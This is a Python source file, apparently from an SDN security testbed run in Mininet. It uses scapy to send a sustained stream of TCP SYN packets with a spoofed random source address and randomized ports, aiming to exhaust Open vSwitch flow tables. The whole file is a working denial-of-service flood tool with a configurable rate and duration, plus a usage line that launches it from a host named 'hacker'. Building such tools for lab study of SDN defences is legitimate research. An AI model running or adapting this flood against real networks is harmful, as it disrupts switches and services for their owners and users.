"""Generate TCP SYN traffic intended to stress flow-table capacity.

This script sends TCP SYN packets with randomized flow keys to encourage Open vSwitch to
install distinct flow entries in SDN switches.

Example usage (from the Mininet CLI):
    mininet> hacker .venv/bin/python3 src/scripts/flow_table_overflow.py 10.0.3.40 -d 30 -p 500
"""

import argparse
import random
import sys
import time
from ipaddress import IPv4Address

from scapy.all import IP, TCP, send

FILE_NAME = __file__.split("/")[-1]


def flow_table_overflow(
    target: IPv4Address, duration: int = 30, pps: int = 500
) -> None:
    """Send many TCP SYN packets with randomized 5-tuples to overflow flow tables.

    Args:
        target: Destination IP address for the SYN packets.
        duration: How long to sustain flooding in seconds.
        pps: Packets per second.
    """
    end = time.monotonic() + duration
    sent = 0

    src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))

    print(f"[{FILE_NAME}] {target=} {duration=}s {pps=}")

    while time.monotonic() < end:
        pkt = IP(
            src=src_ip,
            dst=str(target),
        ) / TCP(
            sport=random.randint(1024, 65535),
            dport=random.randint(1, 65535),
            flags="S",
        )
        send(pkt, verbose=False)
        sent += 1
        time.sleep(1.0 / pps)
    print(f"[{FILE_NAME}] done - {sent} packets sent")


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Send SYN packets with randomized flow keys to overflow flow tables.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("target", type=str, help="Target IPv4 address")
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=30,
        help="Duration in seconds",
    )
    parser.add_argument(
        "-p",
        "--pps",
        type=int,
        default=500,
        help="Packets per second",
    )
    return parser.parse_args()


def main() -> None:
    """Entry point of the script."""
    args = _parse_args()
    try:
        target = IPv4Address(args.target)
    except ValueError:
        print("error: target must be a valid IPv4 address", file=sys.stderr)
        raise

    if args.duration <= 0:
        msg = "Duration must be greater than 0"
        raise ValueError(msg)
    if args.pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    flow_table_overflow(target=target, duration=args.duration, pps=args.pps)


if __name__ == "__main__":
    main()
